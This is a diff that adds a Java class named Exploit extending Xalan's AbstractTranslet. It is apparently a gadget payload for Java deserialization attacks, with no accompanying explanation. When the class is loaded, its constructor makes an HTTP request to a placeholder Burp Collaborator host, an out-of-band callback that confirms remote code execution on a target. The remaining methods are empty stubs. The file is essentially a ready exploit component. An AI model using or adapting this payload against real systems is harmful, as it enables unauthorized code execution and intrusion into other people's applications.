@@ -1,0 +1,25 @@
+import java.io.*;
+import java.net.*;
+ 
+public class Exploit extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet {
+  public Exploit() throws Exception {
+    StringBuilder result = new StringBuilder();
+    URL url = new URL("http://[your-url].burpcollaborator.net");
+    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+    conn.setRequestMethod("GET");
+    BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+    String line;
+    while ((line = rd.readLine()) != null) {
+      result.append(line);
+    }
+    rd.close();
+  }
+ 
+  @Override
+  public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, com.sun.org.apache.xml.internal.serializer.SerializationHandler handler) {
+  }
+ 
+  @Override
+  public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handler)  {
+  }
+}
